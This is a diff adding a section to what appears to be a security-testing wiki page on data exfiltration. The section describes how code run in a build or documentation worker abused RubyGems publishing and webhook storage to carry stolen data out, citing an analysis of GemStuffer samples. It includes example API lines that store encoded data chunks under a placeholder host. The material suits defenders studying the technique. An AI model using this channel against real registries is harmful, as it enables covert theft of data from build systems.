@@ -292,6 +292,19 @@ Notes:
 ../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
 {{#endref}}
 
+## Registry artifacts as a return channel
+
+When code already executes in a build or documentation worker and can authenticate to a package registry, the registry itself can be a return channel. In the GemStuffer examples, one payload built a **new gem** with fetched response files and attempted to push it through RubyGems' `/api/v1/gems`; another wrote the fetched response into `README.md`, removed its `.yardopts` loader, and attempted to publish a **new version of the same gem**. This is distinct from an installation-time hook and requires a valid publishing credential and outbound registry access.<sup>[[12]](#references)[[13]](#references)</sup>
+
+A second variant used the registry's **webhook configuration as storage**, not as an outbound callback. It compressed a response with zlib, URL-safe Base64-encoded it, removed padding, and split it into numbered URL segments of at most 220 characters. With a key allowed to manage webhooks, `POST /api/v1/web_hooks` accepts `gem_name` and `url`; `GET /api/v1/web_hooks.json` lists the saved URLs for that account. Numbered segments plus an end marker let an authorized reader reconstruct the data. The example's `example.com` host was only a placeholder inside the saved value, not evidence of a working C2 endpoint or successful delivery.<sup>[[12]](#references)[[13]](#references)</sup>
+
+```text
+POST /api/v1/web_hooks   gem_name=<owned-gem>&url=https://example.com/A000/<chunk>/
+GET  /api/v1/web_hooks.json   # read stored URLs using the same account's key
+```
+
+For the initial [YARD `.yardopts` execution path](../pentesting-web/dependency-confusion.md#related-pattern-package-controlled-documentation-builds), the registry channel is only a post-execution possibility. A successful `POST` or later readable artifact must be observed separately; the cited samples mainly show attempted publication and registration.<sup>[[12]](#references)</sup>
+
 ## Rclone (cloud/object-storage exfiltration)
 
 Modern operators often **stage loot locally** and then use [Rclone](https://rclone.org/) to make the transfer look like a normal backup or sync job. A practical pattern is:
@@ -632,5 +645,7 @@ Then copy-paste the text into the windows-shell and a file called nc.exe will be
 - [9] [QUIC-Exfil: Exploiting QUIC's Server Preferred Address Feature to Perform Data Exfiltration Attacks](https://arxiv.org/abs/2505.05292)
 - [10] [Put Blob (REST API) - Azure Storage](https://learn.microsoft.com/en-us/rest/api/storageservices/put-blob)
 - [11] [Rclone documentation](https://rclone.org/docs/#configuration-encryption)
+- [12] [JFrog Security Research – GemStuffer analysis](https://research.jfrog.com/post/gemstuffer-openai-rubygems)
+- [13] [RubyGems.org API – gem and webhook methods](https://guides.rubygems.org/rubygems-org-api/)
 
 {{#include ../banners/hacktricks-training.md}}
